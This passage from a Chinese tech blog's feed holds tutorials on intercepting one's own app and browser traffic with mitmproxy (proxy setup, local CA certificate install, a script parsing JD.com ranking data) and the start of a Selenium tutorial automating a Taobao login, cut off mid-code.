      <title>mitmproxy实战-通过mitmdump爬取京东金榜排行数据</title>
      <link href="/posts/81e07ee2/"/>
      <url>/posts/81e07ee2/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/0-mitmproxy.jpg" alt="mitmproxy"></p><p>对于APP的数据爬取或需要构建复杂的接口参数数据的爬取可以通过mitmproxy抓包还原流量，解析流量数据包来获取。mitmproxy是一个免费的开源交互式的HTTPS代理工具。它类似于其他抓包工具如WireShark和Fiddler，支持抓取HTTP和HTTPS协议的数据包，并可以通过控制台形式进行操作。mitmproxy具有两个非常有用的组件：mitmdump和mitmweb。mitmdump是mitmproxy的命令行接口，可以直接抓取请求数据。</p><p>本文介绍通过通过mitmdump爬取京东金榜数据。</p><p>京东金榜只有H5小程序和京东APP才有，用直接http请求来爬取数据很麻烦需要找到相应的接口构建很复杂的参数。通过mitmproxy代理抓包，从流量包中解析需要的数据相对来说要容易得多。</p><h2 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h2><p>安装mitmproxy并配置客户端。具体步骤见<a href="http://xiejava.ishareread.com/posts/699b1506/" target="_blank" rel="noopener">《mitmproxy安装与配置》</a><br>如果需要通过APP爬取，需要安装APP的模拟器，这里推荐用夜神模拟器。<br>启动模拟器后APP的网络配置一样的要配置通过mitmproxy的代理，因为APP一般都是通过HTTPS访问的，还需要安装证书。</p><h3 id="1、模拟器安卓操作系统安装证书"><a href="#1、模拟器安卓操作系统安装证书" class="headerlink" title="1、模拟器安卓操作系统安装证书"></a>1、模拟器安卓操作系统安装证书</h3><p>夜神模拟器可以直击访问本地的windows目录和模拟器的安卓目录，我们需要将mitmproxy的安卓证书传输到模拟器的安卓文件夹，点击夜神模拟器的文件助手<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/1-%E5%A4%9C%E7%A5%9E%E6%96%87%E4%BB%B6%E5%8A%A9%E6%89%8B.png" alt="夜神模拟器的文件助手"></p><p>将mitmproxy的安卓证书传到安卓端。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/2-%E4%BC%A0%E8%BE%93mitmproxy%E7%9A%84%E5%AE%89%E5%8D%93%E8%AF%81%E4%B9%A6.png" alt="将mitmproxy的安卓证书传到安卓端"></p><p>安装证书：  安卓模拟器–&gt;设置–&gt;安全–&gt;从SD卡安装<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/3-%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6.png" alt="安装证书"></p><p>选择开始传到安卓文件夹中的证书文件<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/4-%E9%80%89%E6%8B%A9%E8%AF%81%E4%B9%A6.png" alt="选择证书文件"></p><p>输入PIN码<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/5-%E8%BE%93%E5%85%A5PIN%E7%A0%81.png" alt="输入PIN码"></p><p>为证书取个名字如mitmproxy，点击确定就可以了<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/6-%E8%AF%81%E4%B9%A6%E5%91%BD%E5%90%8D.png" alt="证书命名"></p><p>查看证书可以点击“用户凭据”<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/7-%E6%9F%A5%E7%9C%8B%E8%AF%81%E4%B9%A6.png" alt="查看证书"></p><p>可以看到mitmproxy的CA证书已经安装好了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/8-%E9%AA%8C%E8%AF%81%E8%AF%81%E4%B9%A6.png" alt="确认证书"></p><h3 id="2、模拟器安卓操作系统配置代理"><a href="#2、模拟器安卓操作系统配置代理" class="headerlink" title="2、模拟器安卓操作系统配置代理"></a>2、模拟器安卓操作系统配置代理</h3><p>安装好了CA证书，还要配置模拟器安卓操作系统的网络代理。<br>点击模拟其中的无线和网络中的WLAN<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/9-%E8%AE%BE%E7%BD%AEwlan%E7%BD%91%E7%BB%9C.png" alt="设置网络"></p><p>选择默认的无线连接WiredSSID在弹出的菜单中选择“修改网络”<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/10-%E4%BF%AE%E6%94%B9%E7%BD%91%E7%BB%9C.png" alt="修改网络"></p><p>设置mitmproxy的服务器主机IP和代理服务器端口，服务器主机IP就是宿主机windows主机的IP，端口就是起mitmproxy服务的端口。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/11-%E8%AE%BE%E7%BD%AEmitmproxy%E4%BB%A3%E7%90%86.png" alt="设置代理"></p><p>mitmproxy和模拟器都准备好以后就可以分析京东金榜的数据了。</p><h2 id="二、分析数据"><a href="#二、分析数据" class="headerlink" title="二、分析数据"></a>二、分析数据</h2><p>京东金榜H5小程序的地址是 <a href="https://h5.m.jd.com/babelDiy/Zeus/32xRoXWmepbBVHfDMoHMw2kGfHdF/index.html" target="_blank" rel="noopener">https://h5.m.jd.com/babelDiy/Zeus/32xRoXWmepbBVHfDMoHMw2kGfHdF/index.html</a><br>我们可以用浏览器访问这个地址来分析需要爬取数据的接口和相应返回的数据格式。在这里可以到到京东金榜的数据接口是<a href="https://api.m.jd.com/client.action，通过POST请求来获取的金榜数据。" target="_blank" rel="noopener">https://api.m.jd.com/client.action，通过POST请求来获取的金榜数据。</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/12-%E5%88%86%E6%9E%90%E6%8E%A5%E5%8F%A3.png" alt="分析接口"></p><p>通过Preview仔细分析数据接口返回的金榜数据的JSON格式<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/13-%E5%88%86%E6%9E%90%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE.png" alt="分析数据"></p><p>接下来我们就要根据接口和JSON格式的数据来写代码获取并解析相应的数据信息。</p><h2 id="三、爬取数据"><a href="#三、爬取数据" class="headerlink" title="三、爬取数据"></a>三、爬取数据</h2><p>在这里我们通过response接口获取通过mitmproxy代理后的流量进行解析，实现对京东金榜数据的获取。爬取数据的jdrank_scripts.py具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">response</span><span class="params">(flow)</span>:</span></span><br><span class="line">    url = <span class="string">'https://api.m.jd.com/client.action'</span></span><br><span class="line">    <span class="keyword">if</span> flow.request.url.startswith(url):</span><br><span class="line">        text = flow.response.text</span><br><span class="line">        json_data = json.loads(text)</span><br><span class="line">        <span class="comment">#print(json_data)</span></span><br><span class="line">        <span class="comment">#获取金榜排行</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'result'</span> <span class="keyword">in</span> json_data) <span class="keyword">and</span> (<span class="string">'tabs'</span> <span class="keyword">in</span> json_data[<span class="string">'result'</span>]):</span><br><span class="line">            getMainGoldRank(json_data)</span><br><span class="line">        <span class="comment">#获取金榜排行商品列表</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'result'</span> <span class="keyword">in</span> json_data) <span class="keyword">and</span> (<span class="string">'mainRank'</span> <span class="keyword">in</span> json_data[<span class="string">'result'</span>]):</span><br><span class="line">            getJDProductInfo(json_data)</span><br><span class="line">    <span class="comment">#获取商品信息</span></span><br><span class="line">    <span class="keyword">if</span> flow.request.url.startswith(url):</span><br><span class="line">        text = flow.response.text</span><br><span class="line">        json_data = json.loads(text)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'floors'</span> <span class="keyword">in</span> json_data) <span class="keyword">and</span> len(json_data[<span class="string">'floors'</span>])&gt;<span class="number">1</span>:</span><br><span class="line">            prod_skuId=json_data[<span class="string">'floors'</span>][<span class="number">0</span>].get(<span class="string">'data'</span>).get(<span class="string">'extMap'</span>).get(<span class="string">'skuId'</span>)</span><br><span class="line">            prod_introduceInfo=text</span><br><span class="line">            print(<span class="string">'-------prod_skuId-------:+++'</span>,prod_skuId)</span><br><span class="line">            print(prod_skuId, prod_introduceInfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取金榜列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMainGoldRank</span><span class="params">(json_data)</span>:</span></span><br><span class="line">    tabs = json_data[<span class="string">'result'</span>][<span class="string">'tabs'</span>]</span><br><span class="line">    <span class="keyword">for</span> tab <span class="keyword">in</span> tabs:</span><br><span class="line">        tabName = tab[<span class="string">'tabName'</span>]  <span class="comment"># 榜单名称</span></span><br><span class="line">        tabData = tab[<span class="string">'data'</span>]  <span class="comment"># 榜单数据</span></span><br><span class="line">        print(type(tabData))</span><br><span class="line">        <span class="keyword">if</span> type(tabData) <span class="keyword">is</span> list:</span><br><span class="line">            <span class="keyword">for</span> rankdata <span class="keyword">in</span> tabData:</span><br><span class="line">                rankId = rankdata[<span class="string">'id'</span>]</span><br><span class="line">                rankTitle = rankdata[<span class="string">'name'</span>]</span><br><span class="line">                rankType = rankdata[<span class="string">'rankType'</span>]</span><br><span class="line">                skuId=<span class="literal">None</span></span><br><span class="line">                print(tabName, rankId, rankType, rankTitle, skuId)</span><br><span class="line">        <span class="keyword">if</span> type(tabData) <span class="keyword">is</span> dict:</span><br><span class="line">            relatedAdvIds = tab[<span class="string">'relatedAdvIds'</span>]</span><br><span class="line">            <span class="keyword">if</span> type(relatedAdvIds) <span class="keyword">is</span> list:</span><br><span class="line">                <span class="keyword">for</span> relatedAdvId <span class="keyword">in</span> relatedAdvIds:</span><br><span class="line">                    rankList = tabData[relatedAdvId][<span class="string">'rankList'</span>]</span><br><span class="line">                    <span class="keyword">for</span> rankdata <span class="keyword">in</span> rankList:</span><br><span class="line">                        rankId = rankdata[<span class="string">'rankId'</span>]</span><br><span class="line">                        rankTitle = rankdata[<span class="string">'rankType'</span>]</span><br><span class="line">                        rankType = rankdata[<span class="string">'rankTitle'</span>]</span><br><span class="line">                        skuId = rankdata[<span class="string">'skuId'</span>]</span><br><span class="line">                        print(tabName, rankId, rankType, rankTitle, skuId)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取JD金榜商品概要信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getJDProductInfo</span><span class="params">(json_data)</span>:</span></span><br><span class="line">    <span class="comment">#if ('result' in json_data) and ('mainRank' in json_data['result']):</span></span><br><span class="line">    print(json_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        products=json_data[<span class="string">'result'</span>][<span class="string">'mainRank'</span>][<span class="string">'products'</span>]</span><br><span class="line">        prod_main_rank=json_data[<span class="string">'result'</span>][<span class="string">'mainRank'</span>]</span><br><span class="line">        prod_rankId=prod_main_rank.get(<span class="string">'id'</span>)</span><br><span class="line">        <span class="comment">#判断如果没有在main_gold_rank表中则添加记录至main_gold_rank表</span></span><br><span class="line">        rankTitle=prod_main_rank.get(<span class="string">'name'</span>)</span><br><span class="line">        print(<span class="string">''</span>, prod_rankId,rankTitle , <span class="number">13</span>, <span class="string">''</span>)</span><br><span class="line">        <span class="keyword">for</span> product <span class="keyword">in</span> products:</span><br><span class="line">            prod_skuId = product[<span class="string">'product'</span>][<span class="string">'skuId'</span>]</span><br><span class="line">            prod_name = product[<span class="string">'product'</span>][<span class="string">'name'</span>]</span><br><span class="line">            prod_img = product[<span class="string">'product'</span>][<span class="string">'img'</span>]</span><br><span class="line">            prod_skuSallingPoint = product.get(<span class="string">'skuSallingPoint'</span>)</span><br><span class="line">            prod_saleInfoStr = product.get(<span class="string">'saleInfoStr'</span>)</span><br><span class="line">            prod_simpleSaleInfoStr = product.get(<span class="string">'simpleSaleInfoStr'</span>)</span><br><span class="line">            prod_totalBuyInfoStr = product.get(<span class="string">'totalBuyInfoStr'</span>)</span><br><span class="line">            prod_goodCountStr = product.get(<span class="string">'goodCountStr'</span>)</span><br><span class="line">            prod_simpleGoodCountStr = product.get(<span class="string">'simpleGoodCountStr'</span>)</span><br><span class="line">            prod_totalPopularity = product.get(<span class="string">'totalPopularity'</span>)</span><br><span class="line">            prod_popularityStr = product.get(<span class="string">'popularityStr'</span>)</span><br><span class="line">            prod_cmttTag = product.get(<span class="string">'cmttTag'</span>)</span><br><span class="line">            prod_longTitle = product.get(<span class="string">'longTitle'</span>)</span><br><span class="line">            prod_authorityScore = product.get(<span class="string">'authorityScore'</span>)</span><br><span class="line">            prod_saleScore = product.get(<span class="string">'saleScore'</span>)</span><br><span class="line">            prod_popularityScore = product.get(<span class="string">'popularityScore'</span>)</span><br><span class="line">            prod_growthScore = product.get(<span class="string">'growthScore'</span>)</span><br><span class="line">            prod_praiseScore = product.get(<span class="string">'praiseScore'</span>)</span><br><span class="line">            prod_brandScore = product.get(<span class="string">'brandScore'</span>)</span><br><span class="line">            prod_brandStr = product.get(<span class="string">'brandStr'</span>)</span><br><span class="line">            prod_growthStr = product.get(<span class="string">'growthStr'</span>)</span><br><span class="line">            prod_sortedSaleIfoStr = product.get(<span class="string">'sortedSaleIfoStr'</span>)</span><br><span class="line">            prod_rankNum = product.get(<span class="string">'rankNum'</span>)</span><br><span class="line">            print(prod_rankId,prod_skuId,prod_name,prod_img,prod_skuSallingPoint,prod_saleInfoStr,prod_simpleSaleInfoStr,prod_totalBuyInfoStr,</span><br><span class="line">            prod_goodCountStr,prod_simpleGoodCountStr,prod_totalPopularity,prod_popularityStr,prod_cmttTag,prod_longTitle,</span><br><span class="line">            prod_authorityScore,prod_saleScore,prod_popularityScore,prod_growthScore,prod_praiseScore,prod_brandScore,prod_brandStr,prod_growthStr,prod_sortedSaleIfoStr,prod_rankNum)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'getJDProductInfo Error:'</span>, e)</span><br></pre></td></tr></table></figure><p>通过运行  <code>mitmdump -s jdrank_scripts.py</code><br>用浏览器访问京东H5的小程序<a href="https://h5.m.jd.com/babelDiy/Zeus/32xRoXWmepbBVHfDMoHMw2kGfHdF/index.html" target="_blank" rel="noopener">https://h5.m.jd.com/babelDiy/Zeus/32xRoXWmepbBVHfDMoHMw2kGfHdF/index.html</a><br>从H5的小程序访问获取京东金榜的排行数据<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/14-%E8%8E%B7%E5%8F%96%E9%87%91%E6%A6%9C%E6%8E%92%E8%A1%8C.png" alt="获取京东金榜排行"></p><p>获取京东金榜商品信息<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240304/15-%E8%8E%B7%E5%8F%96%E9%87%91%E6%A6%9C%E5%95%86%E5%93%81%E5%88%97%E8%A1%A8.png" alt="获取京东金榜商品信息"></p><p><strong>从京东APP上访问京东金榜也是同样的效果。</strong> </p><p>至此，本文从环境准备到数据分析到代码实现，通过mitmdump爬取京东金榜排行数据进行mitmproxy爬取数据的实战。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mitmproxy安装与配置</title>
      <link href="/posts/699b1506/"/>
      <url>/posts/699b1506/</url>
      
        <content type="html"><![CDATA[<p>mitmproxy是一个免费的开源交互式的HTTPS代理工具。它类似于其他抓包工具如WireShark和Fiddler，支持抓取HTTP和HTTPS协议的数据包，并可以通过控制台形式进行操作。mitmproxy具有两个非常有用的组件：mitmdump和mitmweb。mitmdump是mitmproxy的命令行接口，可以直接抓取请求数据，而mitmweb是一个web程序，可以清楚地观察mitmproxy抓取的请求数据。</p><p>此外，mitmproxy的特点之一是它支持Python自定义脚本，这使得mitmproxy的使用更加灵活和强大。通过安装mitmproxy，用户可以实时查看、记录、修改数据，引发服务端或客户端的特定行为。mitmproxy是一个功能强大的抓包工具，具有广泛的应用场景，如网络调试、安全测试、数据分析等。</p><p>本文介绍mitmproxy的安装与配置，通过mitmproxy代理进行抓包。</p><h2 id="一、mitmproxy的安装"><a href="#一、mitmproxy的安装" class="headerlink" title="一、mitmproxy的安装"></a>一、mitmproxy的安装</h2><p>首先需要安装好python，版本需要不低于3.6，且安装了附带了包管理工具pip<br>在命令行中输入<code>pip install mitmproxy</code>，等待安装完成。<br>安装完成后，系统将拥有mitmproxy、mitmdump、mitmweb三个命令，可以通过<code>mitmdump</code>检查一下mitmproxy是否安装成功了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240229/1-%E6%9F%A5%E7%9C%8Bmitmproxy%E7%89%88%E6%9C%AC.png" alt="查看mitmproxy版本"></p><h2 id="二、运行mitmproxy"><a href="#二、运行mitmproxy" class="headerlink" title="二、运行mitmproxy"></a>二、运行mitmproxy</h2><p>要启动 mitmproxy 用 mitmproxy、mitmdump、mitmweb 这三个命令中的任意一个即可，这三个命令功能一致，且都可以加载自定义脚本，唯一的区别是交互界面的不同。</p><p>启动mitmproxy后，客户端要配置指定通过mitmproxy代理来访问目标网站的服务资源。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240229/2-how-mitmproxy-works-explicit.png" alt="mitmproxy代理工作原理"></p><h3 id="1、配置客户端代理"><a href="#1、配置客户端代理" class="headerlink" title="1、配置客户端代理"></a>1、配置客户端代理</h3><p>运行mitmproxy默认代理的端口是8080，所以要配置浏览器通过mitmproxy代理来访问目标网站。</p><h4 id="方式一，设置全局代理"><a href="#方式一，设置全局代理" class="headerlink" title="方式一，设置全局代理"></a>方式一，设置全局代理</h4><p>设置全局代理，在window中找到网络和Internet，点击手动设置代理，将使用代理服务器的开关打开，设置代理IP地址为127.0.0.1，端口为8080<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240229/3-windows%E8%AE%BE%E7%BD%AE%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86.png" alt="设置全局代理"></p><h4 id="方式二，设置浏览器代理"><a href="#方式二，设置浏览器代理" class="headerlink" title="方式二，设置浏览器代理"></a>方式二，设置浏览器代理</h4><p>通过浏览器插件设置浏览器代理，如chrome浏览器可以通过SwitchyOmega插件设置代理<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240229/4-SwitchyOmega%E6%8F%92%E4%BB%B6%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86.png" alt="通过SwitchyOmega插件设置代理"></p><p>通过mitmproxy命令启动mitmproxy后通过设置代理后的浏览器访问<a href="http://xiejava.ishareread.com，可以看到通过mitmproxy代理后的访问流量日志。" target="_blank" rel="noopener">http://xiejava.ishareread.com，可以看到通过mitmproxy代理后的访问流量日志。</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240229/5-%E8%AE%BF%E9%97%AEhttp%E7%9A%84%E7%BD%91%E7%AB%99.png" alt="http抓包日志情况"></p><h3 id="2、客户端安装mitmproxy提供的CA证书"><a href="#2、客户端安装mitmproxy提供的CA证书" class="headerlink" title="2、客户端安装mitmproxy提供的CA证书"></a>2、客户端安装mitmproxy提供的CA证书</h3><p>对于访问https加密的网站需要证书才能解密，所以客户端需要安装mitmproxy提供的CA证书。<br>通过mitmporxy代理浏览器访问<a href="http://mitm.it/将显示mitmproxy证书下载和安装指导页面" target="_blank" rel="noopener">http://mitm.it/将显示mitmproxy证书下载和安装指导页面</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240229/6-mitmproxy%E8%AF%81%E4%B9%A6%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E9%A1%B5%E9%9D%A2.png" alt="mitmproxy证书下载和安装指导页面"></p><p>可以看到mitmproxy提供了各种操作系统的CA证书，点击”Show Instructions”,将显示证书的安装指导，可以根据指导一步步安装成功。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240229/7-mitmproxy%E8%AF%81%E4%B9%A6%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4%E4%BB%8B%E7%BB%8D.png" alt="证书的安装指导"></p><p>对于Windows系统：</p><h4 id="手工安装步骤："><a href="#手工安装步骤：" class="headerlink" title="手工安装步骤："></a>手工安装步骤：</h4><ol><li>双击mitmproxy提供的CA证书文件（通常是mitmproxy-ca.p12）。</li><li>在出现的导入证书引导页中，直接点击“下一步”按钮。</li><li>接下来会出现密码设置提示，这里不需要设置密码，直接点击“下一步”按钮。</li><li>选择证书的存储区域。通常选择“将所有的证书都放入下列存储”，然后点击“浏览”按钮，选择证书存储位置为“受信任的根证书颁发机构”，接着点击“确定”按钮。</li><li>点击“下一步”按钮完成证书的导入。</li><li>如果有安全警告弹出，直接点击“是”按钮即可。</li></ol><h4 id="自动安装步骤："><a href="#自动安装步骤：" class="headerlink" title="自动安装步骤："></a>自动安装步骤：</h4><p>在window中用管理员权限运行PowerShell，在命令行控制台，进去到证书的目录，一般是在c:\Users\yourname.mitmproxy目录下。执行 <code>certutil.exe -addstore root mitmproxy-ca-cert.cer</code> 如下图所示。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240229/8-%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6%E6%93%8D%E4%BD%9C.png" alt="自动安装证书步骤"></p><p>安装好证书后，通过mitmproxy代理，我们来访问https协议的网站<a href="https://www.taobao.com。可以在后台看到mitmproxy抓取的https流量日志" target="_blank" rel="noopener">https://www.taobao.com。可以在后台看到mitmproxy抓取的https流量日志</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240229/9-%E6%8A%93%E5%8F%96https%E7%BD%91%E7%AB%99%E6%B5%81%E9%87%8F.png" alt="mitmproxy抓取的https流量日志"></p><p>至此，我们成功安装了mitmproxy,并配置了相应的CA证书，通过mitmporxy代理能够获取访问http和https网站的流量数据。后续我们将通过一个实例来进行mitmproxy抓包爬取京东APP的金榜排行的数据信息。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Selenium实战-模拟登录淘宝并爬取商品信息</title>
      <link href="/posts/6e762a1a/"/>
      <url>/posts/6e762a1a/</url>
      
        <content type="html"><![CDATA[<p>现在很多网站要获取数据都得要先登录。Selenium是一个用于Web应用程序测试的自动化工具。它直接运行在浏览器中，模拟真实用户的操作。本文介绍如何通过Selenium来登录淘宝并自动爬取商品信息。<br>关于Selenium的安装与配置请参考博文《<a href="http://xiejava.ishareread.com/posts/8370b2b6/" target="_blank" rel="noopener">Selenium安装与配置</a>》</p><h2 id="一、通过Selenium模拟登录淘宝"><a href="#一、通过Selenium模拟登录淘宝" class="headerlink" title="一、通过Selenium模拟登录淘宝"></a>一、通过Selenium模拟登录淘宝</h2><p>现在要获取淘宝的商品信息需要先登录淘宝。我们先来分析淘宝的登录页面。</p><h3 id="1、分析淘宝登录页面"><a href="#1、分析淘宝登录页面" class="headerlink" title="1、分析淘宝登录页面"></a>1、分析淘宝登录页面</h3><p>淘宝登录页面为<a href="https://login.taobao.com/member/login.jhtml，支持扫描登录和用户名、密码验证登录。我们模拟用户名、密码登录。" target="_blank" rel="noopener">https://login.taobao.com/member/login.jhtml，支持扫描登录和用户名、密码验证登录。我们模拟用户名、密码登录。</a><br>通过Chrome浏览器输入淘宝登录页面链接F12打开开发者工具，分析淘宝登录页的源代码，找到登录账号、登录密码和登录按钮的相关控件的源代码<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240226/1-%E6%B7%98%E5%AE%9D%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E5%88%86%E6%9E%90.png" alt="分析淘宝登录页面"></p><p>在这里可以看到<br>账号名的输入框控件代码:<code>&lt;input name=&quot;fm-login-id&quot; type=&quot;text&quot; class=&quot;fm-text&quot; id=&quot;fm-login-id&quot; tabindex=&quot;1&quot; aria-label=&quot;账号名/邮箱/手机号&quot; placeholder=&quot;账号名/邮箱/手机号&quot; autocapitalize=&quot;off&quot; data-spm-anchor-id=&quot;a2107.1.0.i1.3e3e11d9pGQKXf&quot;&gt;</code><br>登录密码的输入框控件代码：<code>&lt;input name=&quot;fm-login-password&quot; type=&quot;password&quot; class=&quot;fm-text&quot; id=&quot;fm-login-password&quot; tabindex=&quot;2&quot; aria-label=&quot;请输入登录密码&quot; placeholder=&quot;请输入登录密码&quot; maxlength=&quot;40&quot; autocapitalize=&quot;off&quot; data-spm-anchor-id=&quot;a2107.1.0.i2.3e3e11d9pGQKXf&quot;&gt;</code><br>登录按钮的控件代码：<code>&lt;button type=&quot;submit&quot; tabindex=&quot;3&quot; class=&quot;fm-button fm-submit password-login&quot; data-spm-anchor-id=&quot;a2107.1.0.i3.3e3e11d9pGQKXf&quot;&gt;登录&lt;/button&gt;</code><br>找到登录需要用的的这几个关键控件代码都就可以开始编码来控制这些控件进行模拟操作了。</p><h3 id="2、通过Selenium实现模拟登录代码"><a href="#2、通过Selenium实现模拟登录代码" class="headerlink" title="2、通过Selenium实现模拟登录代码"></a>2、通过Selenium实现模拟登录代码</h3><p>具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.common <span class="keyword">import</span> TimeoutException</span><br><span class="line"></span><br><span class="line">driver=Chrome()</span><br><span class="line">wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line"></span><br><span 